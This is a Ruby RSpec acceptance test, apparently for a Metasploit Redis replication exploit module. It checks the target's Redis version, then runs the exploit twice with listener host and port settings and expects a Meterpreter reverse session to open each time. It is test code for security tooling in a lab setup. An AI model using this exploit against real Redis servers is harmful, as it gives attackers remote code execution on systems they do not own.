require 'acceptance_spec_helper'
require_relative '../../../test/module_targets/redis_replication_custom/acceptance'

RSpec.describe 'Genuine Redis dynamically compiled owner', order: :defined do
  include_context 'module target'
  include_context 'wait_for_expect'
  include Acceptance::RedisReplicationCustom

  let(:owner) { Acceptance::RedisReplication::OWNER }

  before(:all) { rr_boot }

  it 'checks the independently validated Redis service' do
    output = run_target_module(owner, 'target', {}, action: 'check')
    expect(output).to include('Redis version is 5.0.14')
  end

  it 'compiles and uses the untouched default payload twice with state restored' do
    @rr[:owning_compilations] = []
    2.times do |index|
      output = run_target_module(owner, 'target', {
        'LHOST' => listener_host, 'LPORT' => 4444, 'SRVHOST' => listener_host, 'SRVPORT' => 6380
      }, action: 'run -z', command_timeout: 180, reuse_module: index.positive?)
      expect(output).to include('Compile redis module extension file', 'Payload generated successfully!')
      expect(output).to match(/Meterpreter session \d+ opened/)
      actual = rr_json("{fullname:active_module.fullname,custom:active_module.datastore['CUSTOM'],compiled:active_module.check_custom,payload:active_module.datastore['PAYLOAD'],forked:active_module.datastore['PrependFork']}")
      expect(actual).to eq('fullname' => owner, 'custom' => true, 'compiled' => true,
                           'payload' => Acceptance::RedisReplication::PAYLOAD, 'forked' => true)
      @rr[:owning_compilations] << rrc_compile('capture', "owner-#{index}")
      rr_use(owner, "owner-#{index}")
      state = rr_state
      @rr[:post_owner] << state
      rr_save
      expect(state).to eq(@rr.fetch(:baseline))
    end
  end

  after(:all) { rr_finish if @rr }
end
